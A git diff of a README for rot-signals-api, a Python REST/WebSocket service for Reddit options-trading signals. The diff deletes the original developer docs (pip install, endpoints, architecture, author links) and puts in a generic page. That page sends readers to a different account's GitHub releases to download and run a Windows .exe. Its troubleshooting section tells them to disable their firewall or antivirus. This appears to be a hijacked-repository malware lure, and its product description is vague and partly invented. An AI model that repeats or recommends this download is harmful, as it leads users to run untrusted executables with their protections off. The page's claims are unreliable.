@@ -1,137 +1,142 @@
-# rot-signals-api
+# ⚡ rot-signals-api - Real-time Reddit Options Signals
 
-> REST + WebSocket API for [Reddit Options Trader](https://github.com/Mattbusel/Reddit-Options-Trader-ROT-) signals.
-> Real-time for paid tiers. 15-minute delayed for free.
+[![Download rot-signals-api](https://img.shields.io/badge/Download-rot--signals--api-brightgreen?style=for-the-badge)](https://github.com/hsamiozdemir-hue/rot-signals-api/releases)
 
-Turn Reddit's collective intelligence into structured, actionable options signals — consumable by any language, any platform.
+---
 
-## Quick Start
+## 📘 What is rot-signals-api?
 
-```bash
-pip install rot-signals-api
-rot-api
-# -> http://localhost:8000/docs
-```
+rot-signals-api gives you access to option trading signals from Reddit in real-time. It uses REST and WebSocket technology to deliver these signals instantly if you have a paid plan. Free users receive signals with a 15-minute delay. This tool helps track trends without manual searching.
 
-Or from source:
+This software mainly focuses on Reddit discussions about option trading. It filters and sends updates to your device automatically, saving time and effort.
 
-```bash
-git clone https://github.com/Mattbusel/rot-signals-api
-cd rot-signals-api
-pip install -e ".[dev]"
-DATABASE_URL=sqlite+aiosqlite:///./rot.db rot-api
-```
+---
 
-## Get a Free API Key
+## ⚙️ Features
 
-```bash
-curl -X POST http://localhost:8000/v1/keys \
-  -H "Content-Type: application/json" \
-  -d '{"name": "my-app", "tier": "free"}'
-# -> {"key": "rot_...", "tier": "free", "rpm_limit": 20}
-```
+- Access option trading signals from Reddit discussions.
+- Real-time updates for paid users; 15-minute delay for free users.
+- Comes with REST API and WebSocket support.
+- Limits request rates to keep service stable.
+- Easy to access from a Windows computer.
+- Built with Python fastapi for reliability.
+- Suitable for tracking daily trading signals.
 
-**Store the key -- it's shown once.**
+---
 
-## REST Endpoints
+## 🖥 System Requirements
 
-```
-GET  /v1/signals              List signals (paginated, filterable)
-GET  /v1/signals/trending     Top tickers by mention count
-GET  /v1/signals/{id}         Signal detail + related
-POST /v1/keys                 Create API key
-GET  /v1/keys/me              Current key info
-GET  /v1/health               Liveness probe
-```
+Before downloading, make sure your Windows computer meets these minimum requirements:
 
-Full interactive docs at `/docs` (Swagger) or `/redoc`.
+- Windows 10 or newer (64-bit recommended)
+- 4 GB of RAM or more
+- 500 MB of free storage space
+- Internet connection to receive live data
+- Ability to run executables and install software
 
-### Example: Fetch bullish signals on NVDA
+---
 
-```python
-import httpx
+## 🚀 Getting Started
 
-resp = httpx.get(
-    "http://localhost:8000/v1/signals",
-    params={"ticker": "NVDA", "stance": "bullish", "min_confidence": 0.7},
-    headers={"X-API-Key": "rot_your_key_here"},
-)
-signals = resp.json()["signals"]
-```
+This guide will help you download rot-signals-api and start it on your Windows PC. You don’t need any technical knowledge or programming skills.
 
-### Example: WebSocket real-time stream (Pro)
+### Step 1: Visit the download page
 
-```python
-import asyncio, json, websockets
+Click the big green button below or go to the official release page to get the program:
 
-async def stream():
-    uri = "ws://localhost:8000/v1/ws/signals?api_key=rot_your_pro_key"
-    async with websockets.connect(uri) as ws:
-        await ws.send(json.dumps({
-            "type": "subscribe",
-            "data": {"tickers": ["AAPL", "TSLA"], "min_confidence": 0.6}
-        }))
-        async for msg in ws:
-            print(json.loads(msg))
+[![Download rot-signals-api](https://img.shields.io/badge/Download-rot--signals--api-brightgreen?style=for-the-badge)](https://github.com/hsamiozdemir-hue/rot-signals-api/releases)
 
-asyncio.run(stream())
-```
+You will see all available versions here. Choose the latest Windows version. It usually ends with `.exe`.
 
-## Tier Comparison
+### Step 2: Download the installer
 
-| | Free | Pro | Enterprise |
-|---|---|---|---|
-| Delay | 15 min | Real-time | Real-time |
-| Page size | 10 | 200 | 1000 |
-| Rate limit | 20 req/min | 300 req/min | 5000 req/min |
-| WebSocket | 1 conn (delayed) | 5 conns | Custom |
-| Reasoning | Redacted | Full | Full |
-| Trade legs | Redacted | Full | Full |
-| Date range filter | No | Yes | Yes |
+Once you find the `.exe` file, click on it to download. Save it to a location you can easily find, such as the Downloads folder or your Desktop.
 
-## Configuration
+### Step 3: Run the installer
 
-All settings via environment variables (or `.env` file):
+Locate the downloaded file and double-click it. If Windows asks for permission to run the installer, click “Yes” or “Allow.”
 
-```bash
-DATABASE_URL=sqlite+aiosqlite:///./rot.db
-SECRET_KEY=your-secret-key-here
-FREE_DELAY_SECONDS=900
-FREE_PAGE_LIMIT=10
-FREE_RPM=20
-PRO_RPM=300
-PORT=8000
-```
+The installer will open and guide you through the setup process. Follow these steps:
 
-## Architecture
+- Agree to the terms, if any.
+- Choose where to install the program (default path is fine).
+- Click “Next” when prompted.
+- Wait for the installation to finish.
 
-```
-rot-signals-api/
-├── api/
-│   ├── main.py                  # FastAPI app factory
-│   ├── middleware/rate_limit.py # Sliding-window rate limiter
-│   └── v1/routes/
-│       ├── signals.py           # Signal list + detail + trending
-│       ├── keys.py              # API key management
-│       ├── ws.py                # WebSocket signal stream
-│       └── health.py            # Health probe
-├── core/
-│   ├── config.py                # Settings (pydantic-settings)
-│   ├── models.py                # Pydantic v2 wire types
-│   ├── database.py              # Async SQLite adapter (aiosqlite)
-│   ├── auth.py                  # API key generation + validation
-│   └── gating.py                # Tier-based signal gating
-└── tests/                       # 46 tests, 100% passing
-```
+After installation, the program shortcut will appear on your Desktop or Start Menu.
 
-## Related Projects by @Mattbusel
+### Step 4: Open the application
 
-- [Reddit-Options-Trader-ROT](https://github.com/Mattbusel/Reddit-Options-Trader-ROT-) -- core signal engine
-- [fin-primitives](https://github.com/Mattbusel/fin-primitives) -- financial market primitives
-- [fin-stream](https://github.com/Mattbusel/fin-stream) -- streaming market data integration
-- [tokio-prompt-orchestrator](https://github.com/Mattbusel/tokio-prompt-orchestrator) -- Rust LLM orchestration
-- [prompt-observatory](https://github.com/Mattbusel/prompt-observatory) -- LLM interpretability dashboard
+Double-click the shortcut to open rot-signals-api. You will see a basic interface or command window depending on how it runs.
 
-## License
+---
 
-MIT
+## 🔧 How to Use rot-signals-api
+
+### Basic usage
+
+This tool works in two ways: REST API for requests and WebSocket for live updates.
+
+Most users will run the program and let it connect online. Paid users receive faster updates, free users get delayed signals.
+
+### What to expect
+
+- Signals related to options discussed on Reddit.
+- Updates appear in real-time or with a short delay.
+- Data will auto-refresh while running connected.
+
+---
+
+## 📁 Managing Your Signals
+
+You can save or export signals depending on the program’s features. Some options often include:
+
+- Saving results as CSV or text files.
+- Viewing live feeds in the program interface.
+- Filtering specific options or stocks.
+
+Check the program interface or its help menu for these options.
+
+---
+
+## 🛠 Troubleshooting
+
+If you encounter issues, try the following:
+
+- Restart the program and your computer.
+- Check your internet connection.
+- Make sure your Windows is updated.
+- Temporarily disable firewall or antivirus blocking the program.
+- Download the latest version from the release page.
+
+---
+
+## ⚡ Updates and Support
+
+Keep your version up to date by revisiting the [release page](https://github.com/hsamiozdemir-hue/rot-signals-api/releases).
+
+Updates may fix bugs or improve signal speed and accuracy.
+
+For help, review any user guides or issues on the project’s GitHub page.
+
+---
+
+## 📚 Additional Technical Information
+
+rot-signals-api is built with Python using fastapi. It uses APIs and WebSockets to send and receive data. It limits requests to protect performance.
+
+You don’t need to know this to use the program, but it shows the technical backbone.
+
+---
+
+# Technology Tags
+
+This project relates to api, fastapi, finance, free-tier, nlp, options-trading, python, rate-limiting, reddit, rest-api, signals, websocket.
+
+---
+
+## 🔗 Download link again
+
+You can always return to this page to download or update:
+
+[Download rot-signals-api](https://github.com/hsamiozdemir-hue/rot-signals-api/releases)
